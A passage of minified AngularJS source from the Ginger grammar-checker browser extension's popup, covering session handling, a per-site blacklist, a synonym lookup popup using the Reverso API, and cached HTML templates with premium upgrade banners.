        var u = e.proxy({
            module: "gingerchromeext.background.session",
            callFunction: "isLoggedIn",
            promise: true
        });
        var d = function() {
            var t = a.defer();
            e.callPromise({
                module: "gingerchromeext.background.session",
                callFunction: "asyncGetSession"
            }).then(function(e) {
                s = e;
                t.resolve(s);
            });
            return t.promise;
        };
        var f = function() {
            e.callPromise({
                module: "gingerchromeext.background.session",
                callFunction: "asyncGetSession"
            }).then(function(e) {
                s = e;
            });
            t.listen.$on("change", function(e, t) {
                if ("session" in t) {
                    var r = t.session.newValue;
                    if (r && r.token) {
                        s = r;
                        g.$emit("login", r);
                    } else {
                        s = null;
                        g.$emit("logout");
                    }
                    g.$emit("change");
                }
            });
        };
        var p = function() {};
        f();
        return {
            get: c,
            set: l,
            logout: p,
            isLoggedIn: u,
            refresh: d,
            listen: g
        };
    } ]);
})(window.angular);

(function(e) {
    e.module("gingerchromeext.popup.siteBlackList").factory("siteBlackListFactory", [ "storageFactory", "$q", function(n, e) {
        var i = [];
        var o = function(e) {
            if (!e) return "";
            return e.replace(/^[^/]*\/\/(www\.)?/g, "").replace(/[:\/].*$/g, "");
        };
        var a = function(e) {
            if (!i) return -1;
            return i.indexOf(e);
        };
        var r = function(e) {
            if (a(e) === -1) {
                return false;
            } else {
                return true;
            }
        };
        var t = function(e) {
            var t = o(e);
            if (!r(t)) {
                i.push(t);
                n.set("domainBlackList", i);
            }
        };
        var g = function(e) {
            var t = o(e);
            t = t.split(":")[0];
            var r = a(t);
            if (r !== -1) {
                i.splice(r, 1);
                n.set("domainBlackList", i);
            }
        };
        var s = function() {
            n.get("domainBlackList").then(function(e) {
                if (!e) {
                    e = [];
                }
                i = e;
            });
        };
        var c = function() {
            var t = e.defer();
            try {
                gingerModule.get("gingerchromeext.browser").tabs.query({
                    active: true,
                    currentWindow: true
                }, function(e) {
                    t.resolve(o(e[0].url));
                });
            } catch (e) {
                t.resolve(o(location.href));
            }
            return t.promise;
        };
        var l = function() {
            var t = e.defer();
            c().then(function(e) {
                if (r(e)) {
                    t.resolve(true);
                } else {
                    t.resolve(false);
                }
            });
            return t.promise;
        };
        s();
        return {
            add: t,
            remove: g,
            getCurrentHost: c,
            isCurrentHostBlackListed: l
        };
    } ]);
})(window.angular);

(function(e) {
    e.module("gingerchromeext.popup.storage").factory("storageFactory", [ "$q", "$rootScope", function(i, e) {
        var r = e.$new(true);
        var t = function(e, t) {
            if (!e) return;
            var r = i.defer();
            var n = {};
            n[e] = t;
            if (e === "domainBlackList") {}
            gingerModule.get("gingerchromeext.browser").storage.sync.set(n, function() {
                r.resolve();
            });
            return r.promise;
        };
        var n = function(t) {
            var r = i.defer();
            gingerModule.get("gingerchromeext.browser").storage.sync.get(t, function(e) {
                r.resolve(e[t]);
            });
            return r.promise;
        };
        var o = function() {
            gingerModule.get("gingerchromeext.browser").storage.onChanged.addListener(function(e, t) {
                r.$emit("change", e);
            });
        };
        o();
        return {
            get: n,
            set: t,
            listen: r
        };
    } ]);
})(window.angular);

angular.module("gingerchromeext.popup.switch").directive("gingerSwitch", function() {
    function e(t, e, r) {
        t.value = false;
        t.disabled = false;
        r.$observe("disabled", function(e) {
            t.disabled = e;
        });
        t.toggle = function() {
            if (t.disabled) return;
            t.value = !t.value;
        };
    }
    return {
        link: e,
        scope: {
            value: "=ngValue"
        },
        template: '<span ng-class="{active:value, disabled:disabled}" ng-click="toggle()" class="form-control-switch"><span class="form-control-switch-label">{{value?"ON":"OFF"}} </span> <span class="form-control-switch-knob"></span></span>'
    };
});

(function(e) {
    e.module("gingerchromeext.popup.synonympopup").factory("synonympopupFactory", [ "storageFactory", "sessionFactory", "configFactory", "$http", "reportingFactory", function(t, o, e, n, s) {
        var c;
        var l;
        var u = false;
        var r = $gingerWidgetJquery({});
        var i = function() {
            var e = document.selection, t, r, n = null;
            try {
                if (window.getSelection) {
                    e = window.getSelection();
                    if (e.rangeCount) {
                        t = e.getRangeAt(0).cloneRange();
                        if (t.getClientRects) {
                            r = t.getClientRects();
                            if (r.length > 0) {
                                n = t.getClientRects()[0];
                            }
                        }
                        if (x == 0 && y == 0) {
                            var i = document.createElement("span");
                            if (i.getClientRects) {
                                i.appendChild(document.createTextNode("​"));
                                t.insertNode(i);
                                n = $gingerWidgetJquery(i).offset();
                                var o = i.parentNode;
                                o.removeChild(i);
                                o.normalize();
                            }
                        }
                    }
                }
            } catch (e) {}
            return n;
        };
        var a = function() {
            var e = null;
            try {
                if (document.activeElement.nodeName.toLowerCase() !== "body") {
                    e = document.activeElement;
                } else {
                    e = window.getSelection().anchorNode;
                }
            } catch (e) {}
            return e;
        };
        var g = function() {
            var e = "";
            if (window.getSelection) {
                e = $gingerWidgetJquery.trim(window.getSelection().toString());
            } else if (document.selection && document.selection.type != "Control") {
                e = document.selection.createRange().text;
            }
            return e;
        };
        var d = function(e, a) {
            var t = o.get();
            var r = 6;
            if (t.license > 1) {
                r = 12;
            }
            n({
                url: "https://synonyms.reverso.net/api/v2/search/en/" + e + "?rude=false&merge=true&limit=" + r,
                headers: {
                    "X-Reverso-Origin": "ginger.ext.chrome"
                },
                cache: true
            }).then(function(e) {
                var t = {};
                if (u) {
                    u = false;
                    a([]);
                    return;
                }
                if (e.data && e.data.results && e.data.resultsCount > 0) {
                    for (var r in e.data.results) {
                        var n = e.data.results[r];
                        n.cluster.forEach(function(e) {
                            if (!t[e.pos.desc[0]]) t[e.pos.desc[0]] = [];
                            t[e.pos.desc[0]].push(e.word);
                        });
                    }
                } else if (e.data.resultsCount === 0 && e.data.suggestions && e.data.suggestions[0] && e.data.suggestions[0].language === "en") {
                    l = e.data.suggestions[0].word;
                    d(e.data.suggestions[0].word, function(e) {
                        a(e);
                        u = true;
                    });
                }
                t = f(t);
                t = p(t);
                var i = [];
                for (var o in t) {
                    i = i.concat(t[o]);
                }
                a(i);
            }, function(e) {
                a([]);
            });
        };
        var f = function(e) {
            var t = [];
            for (var r in e) {
                var n = JSON.parse(JSON.stringify(e));
                e[r].forEach(function(e) {
                    if (!t.includes(e.toLowerCase())) {
                        t.push(e.toLowerCase());
                    } else {
                        n[r].splice(n[r].indexOf(e), 1);
                    }
                });
            }
            return n;
        };
        var p = function(e) {
            var t = 0;
            for (var r in e) {
                if (e[r].length > 0) t++;
            }
            var n = o.get();
            var i = 6;
            if (n.license > 1) {
                i = 12;
            }
            for (var r in e) {
                e[r] = e[r].slice(0, i / t);
            }
            return e;
        };
        var v = function(e) {
            var t = "";
            for (var r in e) {
                if (t != "") {
                    t += "&";
                }
                t += r + "=" + encodeURIComponent(e[r]);
            }
            return t;
        };
        var m = [];
        var h = function(e) {
            if (e) {
                m.push(e);
                $gingerWidgetJquery(e).on("scroll.definitionScroll", function() {
                    M();
                });
                if (e.parentNode) h(e.parentNode);
            }
        };
        var w = function() {
            for (var e = 0; e < m.length; e++) {
                $gingerWidgetJquery(m[e]).off("scroll.definitionScroll");
            }
            m = [];
        };
        var b = function() {
            c = {};
            c.main = $gingerWidgetJquery("<gdiv contenteditable='false' class='ginger-extension-synonympopup'></gdiv>").appendTo(document.body);
            c.title = $gingerWidgetJquery("<gdiv class='ginger-extension-synonympopup-title'></gdiv>").appendTo(c.main);
            c.subTitle = $gingerWidgetJquery("<gdiv class='ginger-extension-synonympopup-subtitle'></gdiv>").appendTo(c.main);
            c.body = $gingerWidgetJquery("<gdiv class='ginger-extension-synonympopup-body'></gdiv>").appendTo(c.main);
            c.footer = $gingerWidgetJquery("<gdiv class='ginger-extension-synonympopup-footer'></gdiv>").appendTo(c.main);
            c.body.addClass("ginger-extension-synonympopup-body-loading");
        };
        var $ = function(e) {
            var t, r;
            var n = new window.InputEvent("beforeinput", {
                bubbles: !0,
                cancelable: !1,
                inputType: "insertText",
                data: e
            });
            document.activeElement.dispatchEvent(n);
            document.execCommand("insertText", !1, e);
        };
        var C = function(e, t) {
            var r = e.toString();
            if (r.charAt(0) === " ") t = " " + t; else if (r.charAt(0) === " ") t = " " + t;
            if (r.charAt(r.length - 1) === " ") t += " "; else if (r.charAt(r.length - 1) === " ") t += " ";
            return t;
        };
        var M = function() {
            W = false;
            w();
            if (c) $gingerWidgetJquery(c.main).remove();
            c = null;
        };
        var W = false;
        var S = function(g) {
            W = true;
            l = null;
            if (!g.selectionCoordinates) return;
            if (!c) b();
            c.title.html('Synonyms for "' + g.text + '"');
            c.footer.html("");
            var e = 0;
            var t = 300;
            var r = g.selectionCoordinates.bottom + e;
            var n = g.selectionCoordinates.left;
            var i = a();
            if (g.selectionCoordinates.left - t / 2 + g.selectionCoordinates.width / 2 >= 0) {
                n = g.selectionCoordinates.left - t / 2 + g.selectionCoordinates.width / 2;
            }
            if (n + t > i.offsetWidth) {
                n -= n + t - i.offsetWidth;
            }
            $gingerWidgetJquery(c.main).css("left", n);
            $gingerWidgetJquery(c.main).css("top", r);
            $gingerWidgetJquery(c.main).css("z-index", 2147483646);
            $gingerWidgetJquery(c.main).fadeIn();
            u = false;
            d(g.text, function(e) {
                var t = {
                    title: g.text,
                    synonyms: e
                };
                c.body.removeClass("ginger-extension-synonympopup-body-loading");
                c.body.html("");
                if (!t.synonyms.length) {
                    c.title.html("No synonyms found.");
                } else {
                    if (l) {
                        c.body.addClass("ginger-extension-synonympopup-body-not-found");
                        c.title.html('No synonyms found for "' + g.text + '"');
                        c.subTitle.addClass("visible");
                        c.subTitle.html('Showing synonyms for "' + l + '"');
                    }
                    var r = o.get();
                    if (r.license !== 0) {
                        s.reporterGA({
                            category: "Premium",
                            action: "Display Premium for Synonyms",
                            label: null,
                            value: null
                        });
                        var n = "https://www.gingersoftware.com/online_store/ginger_upgrade?cp=GingerChromeExtension-Synonyms-MiniWriter&autk=" + r.token;
                        c.footer.addClass("visible");
                        c.footer.html('Get more synonyms with Premium <a href="' + n + '" target="_blank">Subscribe</a>');
                        c.footer.click(function() {
                            s.reporterGA({
                                category: "Premium",
                                action: "Click Premium for Synonyms",
                                label: null,
                                value: null
                            });
                        });
                    }
                    t.synonyms.forEach(function(a) {
                        var e = $gingerWidgetJquery('<ga class="ginger-extension-synonympopup-body-item">' + a + "</ga>").appendTo(c.body);
                        if (l) return;
                        e.get(0).addEventListener("mousedown", function(e) {
                            var t = g.text[0] === g.text[0].toUpperCase();
                            if (t) {
                                a = a.slice(0, 1).toUpperCase() + a.slice(1);
                            }
                            var r = window.getSelection().toString();
                            var n = r.match(/^\s+/);
                            n = n && n.length ? n[0] : "";
                            var i = r.match(/\s+$/);
                            i = i && i.length ? i[0] : "";
                            a = n + a + i;
                            $(a);
                            s.reporterGA({
                                category: "Synonyms",
                                action: "Pick a Synonym from dropdown",
                                label: "Mini Writer",
                                value: null
                            });
                            s.reporterGA({
                                category: "Onboarding",
                                action: "First Synonyms",
                                label: null,
                                value: null,
                                singleCall: true
                            });
                            M();
                            e.preventDefault();
                            $gingerWidgetJquery(g.node).trigger("paste");
                            var o = null;
                            try {
                                gingerModule.get("gingerchromeext.browser").tabs.query({
                                    active: true,
                                    currentWindow: true
                                }, function(e) {
                                    o = e[0].url;
                                });
                            } catch (e) {
                                console.error("chrome.tabs.query is not supported", e);
                            }
                            return false;
                        }, {
                            capture: true
                        });
                    });
                }
            });
            h(g.node);
        };
        var q = function() {
            document.addEventListener("dblclick", function(e) {
                t.get("enableDefinitionsAndSynonyms").then(function(e) {
                    if (e) {
                        var t = {
                            text: g(),
                            selectionCoordinates: i(),
                            node: a()
                        };
                        var r = $gingerWidgetJquery(t.node).is("input,textarea,*[contenteditable]") && !$gingerWidgetJquery(t.node).is("*[contenteditable='false']");
                        if (r && t.text && !t.text.match(/\s/)) {
                            S(t);
                        }
                    }
                });
            });
            document.addEventListener("keydown", function(e) {
                if (W) M();
            });
            document.addEventListener("click", function(e) {
                M();
            });
        };
        q();
        return {
            show: S,
            hide: M,
            listen: r
        };
    } ]);
})(window.angular);

angular.module("gingerchromeext.popup.templates", [ "partials/home.partial.html", "partials/login.partial.html", "partials/notsupported.partial.html" ]);

angular.module("partials/home.partial.html", []).run([ "$templateCache", function(e) {
    e.put("partials/home.partial.html", '<div class="popup-home">\n' + "    <div ng-class=\"{'popup-campaign':main.hasActiveCampaign}\">\n" + '        <div class="popup-head">\n' + '            <div class="popup-head-logo"><img src="../assets/ginger-logo.svg" alt=""></div>\n' + "\n" + '            <a title="Go Premium" target="_blank" ng-if="session.license !== undefined && session.license!==2" href="https://www.gingersoftware.com/online_store/ginger_upgrade?cp=GingerChromeExtension-GoPremiumButton-MiniWriter&autk={{session.token}}" class="popup-head-license popup-head-license-basic" ng-click="main.reportPremiumClicked()"></a>\n' + "\n" + '            <div class="popup-head-user dd" ng-class="{\'dd-open\':main.ui.userListOpen}" mouseaway="main.ui.setUserListOpen(false)">\n' + '                <a class="dd-trigger" ng-if="session && !session.isAnonym" ng-click="main.ui.setUserListOpen()">\n' + "                    <i ng-class=\"session.license === 2 ? 'gingericon-mini-writer-profile-premium' : 'gingericon-mini-writer-profile'\"></i>\n" + "                </a>\n" + '                <a class="dd-trigger" ng-if="!session || session.isAnonym" ng-click="main.ui.openAuthPage()">\n' + '                    <i class="gingericon-mini-writer-profile"></i>\n' + "                </a>\n" + '                <div class="dd-content" ng-mouseover="main.ui.setUserListOpen(true)">\n' + '                    <div class="popup-head-user-body" ng-if="session.email">\n' + '                        <div class="popup-head-user-body-email" ng-class="{\'premium\': session.license===2}">{{session.email}}</div>\n' + '                        <span class="popup-head-user-body-premium" title="Go Premium" ng-if="session.license===2"></span>\n' + "\n" + "                    </div>\n" + '                    <div class="popup-head-user-foot">\n' + '                        <a target="_blank" href="https://www.gingersoftware.com/PersonalDictionary/{{session.token}}" rel="noopener" class="btn">Personal Dictionary</a>\n' + '                        <a ng-click="main.ui.logout()" class="btn">Log out</a>\n' + "                    </div>\n" + "                </div>\n" + "            </div>\n" + "        </div>\n" + "\n" + '        <div class="popup-body">\n' + '            <div class="popup-body-settings" ng-class="{\'light\' : main.ui.rephraseOpen}">\n' + '                <div class="popup-body-row" ng-if="main.currentHost.indexOf(\'0000000000\')===-1">\n' + '                    <div class="popup-body-col enable-corrections" ng-class="{\'lighter\' : !session || session.isAnonym}">\n' + '                        <div class="popup-body-row-input">\n' + '                            <span ginger-switch ng-value="main.isGingerEnabled" ng-disabled="!main.isSiteSupported || !session || session.isAnonym"></span>\n' + "                        </div>\n" + '                        <div class="popup-body-row-label">\n' + '                        <span ng-if="main.isSiteSupported">\n' + '                            Enable corrections on <img class="popup-body-favicon" ng-if="main.faviconUrl" ng-src="{{main.faviconUrl}}"> <b>{{main.currentHost}}</b>\n' + "                        </span>\n" + '                            <span class="popup-body-not-supported" ng-if="!main.isSiteSupported">\n' + "                            <b>{{main.currentHostName}}</b> not yet supported\n" + "                        </span>\n" + "                        </div>\n" + "                    </div>\n" + '                    <div class="popup-body-col dialect">\n' + '                        <div class="popup-body-row-label">\n' + "                            Dialect\n" + "                        </div>\n" + '                        <div class="dd dialect" ng-class="{\'dd-open\':main.ui.dialectListOpen}" mouseaway="main.ui.setDialectListOpen(false)">\n' + '                            <a class="dd-trigger" ng-click="main.ui.setDialectListOpen()">\n' + "                                <span ng-if=\"main.settings.dialect !== 'indifferent'\">English</span> {{main.settings.dialect}}\n" + "                            </a>\n" + '                            <div class="dd-content" ng-mouseover="main.ui.setDialectListOpen(true)">\n' + '                                <a class="btn" ng-click="main.dialectChanged(\'UK\')">\n' + "                                    English UK\n" + "                                </a>\n" + '                                <a class="btn" ng-click="main.dialectChanged(\'US\')">\n' + "                                    English US\n" + "                                </a>\n" + '                                <a class="btn" ng-click="main.dialectChanged(\'indifferent\')">\n' + "                                    Indifferent\n" + "                                </a>\n" + "                            </div>\n" + "                        </div>\n" + "                    </div>\n" + "                </div>\n" + "\n" + '                <div class="popup-body-row double-click" ng-class="{\'lighter\' : !session || session.isAnonym}">\n' + '                    <div class="popup-body-row-input">\n' + '                        <span ginger-switch ng-disabled="!session || session.isAnonym" ng-value="main.settings.enableDefinitionsAndSynonyms"></span>\n' + "                    </div>\n" + '                    <div class="popup-body-row-label">\n' + "                        Double-click for synonyms and definitions (all sites)\n" + "                    </div>\n" + "                </div>\n" + "            </div>\n" + "\n" + "\n" + "            \x3c!--DomProg Premium banner--\x3e\n" + '            <div ng-if="main.premiumBanner.isShow"\n' + '                 class="popup-body-row popup-body__premium-banner">\n' + "\n" + '                <span class="popup-body__premium-banner__close" ng-click="main.premiumBanner.hide()">✕</span>\n' + "\n" + '                <span class="popup-body__premium-banner__icon">\n' + '                    <svg width="22" height="20" viewBox="0 0 22 20" fill="none" xmlns="http://www.w3.org/2000/svg">\n' + '                    <path d="M0.886355 15.3004L0.88635 15.3004L0.885134 15.3025C0.647489 15.7235 0.5 16.1878 0.5 16.6799C0.5 17.4454 0.77155 18.1549 1.28171 18.675C1.79417 19.1974 2.51921 19.5 3.37008 19.5H18.6299C19.4808 19.5 20.2058 19.1974 20.7183 18.675C21.2285 18.1549 21.5 17.4454 21.5 16.6799C21.5 16.2063 21.3817 15.729 21.1215 15.2876L13.4795 1.93229C13.4794 1.93201 13.4792 1.93174 13.4791 1.93146C12.9461 0.993153 11.9666 0.5 11.0049 0.5C10.0345 0.5 9.05429 0.992268 8.52085 1.93161C8.52072 1.93184 8.5206 1.93207 8.52047 1.93229L0.886355 15.3004ZM10.718 11.8493L10.7179 11.8458L10.582 6.67658C10.582 6.6761 10.582 6.67563 10.582 6.67515C10.58 6.55751 10.6207 6.47894 10.6753 6.42717C10.7324 6.37288 10.8347 6.32092 10.9951 6.32092C11.2866 6.32092 11.421 6.49754 11.418 6.68474C11.418 6.68519 11.418 6.68564 11.418 6.68608L11.2821 11.8458H11.2821L11.282 11.8495C11.2788 12.0193 11.2331 12.0777 11.2173 12.0936C11.2032 12.1077 11.1538 12.1482 11.0049 12.1482C10.8459 12.1482 10.7952 12.1052 10.7818 12.0916C10.7658 12.0753 10.7212 12.0168 10.718 11.8493ZM11.0049 15.3336C10.6736 15.3336 10.4267 15.0679 10.4267 14.8162C10.4267 14.5492 10.67 14.2892 11.0049 14.2892C11.3556 14.2892 11.5928 14.5454 11.5928 14.8162C11.5928 15.0717 11.352 15.3336 11.0049 15.3336Z" fill="#E63939" stroke="white"/>\n' + "                    </svg>\n" + "                </span>\n" + "\n" + '                <div class="popup-body__premium-banner__text" ng-switch="session.falsePremium">\n' + '                    <span ng-switch-when="1">\n' + "                        We haven't received your payment in the past 90 days. Please purchase a new subscription of Ginger <strong>within 14 days</strong> to keep your premium benefits.\n" + "                    </span>\n" + "\n" + '                    <span ng-switch-when="2">\n' + "                        <strong>Your Ginger Premium subscription has expired.</strong> Please purchase a new subscription <strong>within 14 days</strong> to keep your premium benefits.\n" + "                    </span>\n" + "\n" + "                    <span ng-switch-default>\n" + "                        <strong>Your Ginger Premium subscription will be expiring soon.</strong> We have completely redesigned Ginger Writer and are certain you will enjoy the premium benefits we offer now, more than ever. We would like to thank you for being a loyal customer by offering you a special discount of 60% off our Premium plans. Please purchase a new subscription of Ginger <strong>within 14 days</strong> to keep your premium benefits.\n" + "                    </span>\n" + "\n" + "                </div>\n" + "\n" + '                <div class="popup-body__premium-banner__button"\n' + '                     ng-switch="session.falsePremium">\n' + "\n" + "\n" + '                    <a target="_blank"\n' + '                       ng-switch-when="3"\n' + '                       href="https://www.gingersoftware.com/online_store/ginger_upgrade?cid=dypa60xm&cp=GingerFalsePremium-OneTimePayment-Extension"\n' + '                       ng-click="main.reportPremiumClicked()"\n' + "                    >Purchase 60% off Premium</a>\n" + "\n" + '                    <a target="_blank"\n' + '                       ng-switch-when="2"\n' + '                       href="https://www.gingersoftware.com/online_store/ginger_upgrade?cp=GingerFalsePremium-UnlimitedGracePeriod-Extension"\n' + '                       ng-click="main.reportPremiumClicked()"\n' + "                    >Purchase new subscription</a>\n" + "\n" + '                    <a target="_blank"\n' + "                       ng-switch-default\n" + '                       href="https://www.gingersoftware.com/online_store/ginger_upgrade?cp=GingerFalsePremium-UnknownReason-Extension"\n' + '                       ng-click="main.reportPremiumClicked()"\n' + "                    >Purchase new subscription</a>\n" + "                </div>\n" + "\n" + '                <div class="popup-body__premium-banner__bottom-text">\n' + "                    If you have any questions or believe you received this message in error, please\n" + '                    <a target="_blank"\n' + '                       href="https://www.gingersoftware.com/contactus"\n' + "                    >contact us</a>.\n" + "                </div>\n" + "            </div>\n" + "\n" + "\n" + '            <div class="popup-body-row" ng-class="{\'rephrase\' : main.ui.rephraseOpen}">\n' + "                <div class=\"popup-body-editor-wrapper\" ng-class=\"{'rephrase-open': main.ui.rephraseOpen, 'small': !main.ui.rephraseOpen && (!session || session.isAnonym || main.premiumBanner.isShow)}\">\n" + '                    <div class="popup-body-editor-clear" ng-if="!main.ui.rephraseOpen && main.ui.showCopyButton" ng-click="main.ui.clearText()">\n' + "                        &#10005;\n" + "                    </div>\n" + "\n" + '                    <div class="popup-body-editor-buttons">\n' + '                        <a ng-click="main.ui.copyText()" ng-if="main.ui.showCopyButton" class="popup-body-editor-button copy">\n' + '                            <span class="copy" ng-if="!main.ui.showCopySuccess"><i class="gingericon-duplicate"></i> Copy text</span>\n' + '                            <span class="copied" ng-if="main.ui.showCopySuccess"><i class="gingericon-check"></i> Copied</span>\n' + "                        </a>\n" + "                    </div>\n" + '                    <div ng-if="!main.ui.rephraseOpen" class="popup-body-floatingG" rel="noopener">\n' + "                        <span></span>\n" + "                    </div>\n" + "\n" + '                    <div ng-show="!main.ui.rephraseOpen"\n' + '                         ginger-widget-mode="contenteditable"\n' + '                         class="popup-body-editor"\n' + '                         id="mini-writer"\n' + '                         contenteditable="true"\n' + '                         spellcheck="false"\n' + '                         placeholder="Type, paste or select text from any website"></div>\n' + '                    <div ng-show="main.ui.rephraseOpen"\n' + '                         class="popup-body-editor rephrase"\n' + '                         contenteditable="false"\n' + '                         id="rephraser"\n' + '                         spellcheck="false"\n' + '                         placeholder="No sentences to rephrase..."></div>\n' + "                </div>\n" + "            </div>\n" + "        </div>\n" + "\n" + '        <div class="popup-rephrase" ng-if="main.ui.rephraseOpen">\n' + '            <div class="popup-rephrase-header">\n' + "                <h3>Rephrase</h3>\n" + '                <div class="popup-rephrase-header-controls">\n' + '                    <a ng-class="{\'disabled\': main.ui.previousDisabled}" ng-click="main.rephrase.step(\'backward\')"><i class="gingericon-caret-left"></i>&nbsp; Previous</a><a ng-class="{\'disabled\': main.ui.nextDisabled}" ng-click="main.rephrase.step(\'forward\')">Next &nbsp;<i class="gingericon-caret-right"></i></a><a ng-click="main.ui.closeRephrase()">Done</a>\n' + "                </div>\n" + "            </div>\n" + "            <div class=\"popup-rephrase-body\" ng-class=\"{'loading': main.rephrase.loading, 'limited' : main.rephrase.limited}\">\n" + '                <div class="popup-rephrase-body-limit" ng-if="main.rephrase.limited">\n' + '                    <div class="popup-rephrase-body-limit-left">\n' + '                        <div class="popup-rephrase-body-limit-title">\n' + "                            Unlimited Rephrasing\n" + "                        </div>\n" + "                        <p>\n" + "                            Inspiring alternatives to boost your<br>\n" + "                            creativity, clarity and style.\n" + "                        </p>\n" + "                    </div>\n" + '\x3c!--domprog                    <a ng-click="main.reporterGA(\'Premium\', \'Click Rephrase Premium\', \'Click Rephrase Premium\', null)" href="https://www.gingersoftware.com/online_store/ginger_upgrade?cp=GingerChromeExtension-Rephrase-MiniWriter&autk={{main.session.token}}" target="_blank" class="popup-rephrase-body-limit-button">--\x3e\n' + '                    <a href="https://www.gingersoftware.com/online_store/ginger_upgrade?cp=GingerChromeExtension-Rephrase-MiniWriter&autk={{main.session.token}}" target="_blank" class="popup-rephrase-body-limit-button">\n' + "                        Go Premium\n" + "                    </a>\n" + "                </div>\n" + '                <ul ng-if="main.rephrase.result.length">\n' + '                    <li class="popup-rephrase-body-short-sentence" ng-if="main.ui.rephraseShortSentence">\n' + "                        <b>The rephraser is best tuned for sentences between 4 and 30 words.</b>\n" + "                    </li>\n" + '                    <li ng-repeat="result in main.rephrase.result" ng-click="main.rephrase.use($index)" ng-class="{\'active\':($index===main.rephrase.selectedIndex)}">\n' + '                        <a class="popup-rephrase-body-element">\n' + '                            <div class="popup-rephrase-body-element-fragments">\n' + '                                <span ng-repeat="fragment in result.fragments" ng-class="{\'popup-rephrase-body-element-changed\':fragment.changed}">{{fragment.text}}</span>\n' + "                            </div>\n" + '                            <div class="popup-rephrase-body-element-master">\n' + "                                {{main.rephrase.masterPhrase}}\n" + "                            </div>\n" + "                        </a>\n" + "                    </li>\n" + "                </ul>\n" + '                <div class="popup-rephrase-body-empty" ng-if="!main.rephrase.result.length && !main.rephrase.loading">\n' + "                    No alternatives found (text too short, too long or too complex)\n" + "                </div>\n" + "            </div>\n" + "        </div>\n" + "\n" + '        <div class="popup-foot" ng-if="!main.ui.rephraseOpen">\n' + '            <div class="popup-foot-row mute">\n' + '                <div class="popup-body-counter" ng-if="!main.ui.rephraseOpen" ng-class="{\'popup-body-counter-limited\': main.charcount>main.charLimit}" id="popup-body-counter">\n' + '                    <span>{{main.charcount || 0}}</span>/{{main.charLimit}} <span class="popup-body-counter-warning"> Your text was partially checked.</span>\n' + '                    <div ng-if="session.license !== undefined && session.license!==2" class="popup-body-counter-premium">\n' + "                        \x3c!-- GACall --\x3e\n" + '                        <a ng-click="main.reporterGA(\'Premium\', \'Click Premium for Character Limit\', null, null)" target="_blank" href="https://www.gingersoftware.com/online_store/ginger_upgrade?cp=GingerChromeExtension-CorrectionLimit-MiniWriter&autk={{session.token}}">Go Premium</a> to correct longer texts.\n' + "                    </div>\n" + "                </div>\n" + '                <div class="popup-foot-buttons">\n' + '                    <a ng-if="main.ui.showCopyButton"  ng-mousedown="main.ui.openRephrase($event)" class="popup-body-editor-button rephrase">\n' + '                        <span><img src="../assets/rephrase-new-white.svg" alt=""> Rephrase</span>\n' + "                    </a>\n" + '                    <a class="popup-foot-button" ng-if="session && !session.isAnonym" title="Open writer" target="_blank" ng-click="main.ui.openBigWriter()" rel="noopener"><i class="gingericon-expand"></i></a>\n' + "                </div>\n" + '                \x3c!--<a class="popup-foot-app" target="_blank" href="https://www.gingersoftware.com/myginger/apps"> <i class="gingericon-apps"></i> Ginger Apps</a>--\x3e\n' + "            </div>\n" + "\n" + '            <div ng-if="!session || session.isAnonym" class="popup-foot-row popup-foot-loggedout">\n' + '                <div class="popup-foot-loggedout-left">\n' + "                    Sign up <em>for free</em> to<br>\n" + "                    unlock key features\n" + "                </div>\n" + '                <div class="popup-foot-loggedout-right">\n' + "                    <ul>\n" + "                        <li>\n" + "                            Correct text as you type on any website\n" + "                        </li>\n" + "                        <li>\n" + "                            Enable/Disable Ginger on preferred websites\n" + "                        </li>\n" + "                        <li>\n" + "                            Store your personal dictionary\n" + "                        </li>\n" + "                    </ul>\n" + '                    <div class="popup-foot-loggedout-right-actions">\n' + '                        <a ng-click="main.ui.openAuthPage(\'signUp\')" class="btn">Sign up</a><span class="popup-foot-loggedout-right-actions-login">Already have an account? <a ng-click="main.ui.openAuthPage()">Log in</a></span>\n' + "                    </div>\n" + "                </div>\n" + "            </div>\n" + "        </div>\n" + "\n" + '        <div class="selection-popup" ng-if="main.ui.showSelectionPopup">\n' + '        \x3c!--<div class="selection-popup">--\x3e\n' + '            <div class="selection-popup-overlay" ng-click="main.rejectReplaceContentWithSelection()"></div>\n' + '            <div class="selection-popup-body">\n' + "                <b>Do you want to check the selected text for mistakes?</b>\n" + "                <span>If you do so, you'll lose your current text.</span>\n" + '                <button type="button" class="btn decline" ng-click="main.rejectReplaceContentWithSelection()">\n' + "                    No\n" + "                </button>\n" + '                <button type="button" class="btn" ng-click="main.acceptReplaceContentWithSelection()">\n' + "                    Yes\n" + "                </button>\n" + "            </div>\n" + "        </div>\n" + "    </div>\n" + "</div>\n" + "");
} ]);

angular.module("partials/login.partial.html", []).run([ "$templateCache", function(e) {
    e.put("partials/login.partial.html", '\x3c!--<iframe src="{{login.authFrameUrl}}" class="popup-authframe" frameborder="0"></iframe>--\x3e\n' + '<div class="popup-login">\n' + '    <div class="popup-head">\n' + '        <div class="popup-head-logo"><img src="../assets/ginger-logo.svg" alt=""></div>\n' + "    </div>\n" + '    <div class="popup-login-body">\n' + "        <h2>Sign up now to unlock key features</h2>\n" + '        <div class="popup-login-body-features">\n' + "            <ul>\n" + '                <li><img src="../assets/ginger-login-poup-1.png" alt="Ginger Correct"> Correct your text as you type on any website</li>\n' + '                <li><img src="../assets/ginger-login-poup-2.png" alt="Ginger Enable/Disable"> Enable/Disable Ginger on preferred websites</li>\n' + '                <li><img src="../assets/ginger-login-poup-3.png" alt="Ginger Personal dictionary"> Store your personal dictionary</li>\n' + "            </ul>\n" + "        </div>\n" + '        <a href="javascript:" ng-click="login.openAuthPage()" class="popup-login-body-btn">Login</a>\n' + '        <div class="popup-login-body-link">Don’t have an account? <a href="javascript:" ng-click="login.openAuthPage(\'signup\')">Sign Up It’s free</a></div>\n' + "    </div>\n" + "</div>\n" + "");
} ]);

angular.module("partials/notsupported.partial.html", []).run([ "$templateCache", function(e) {
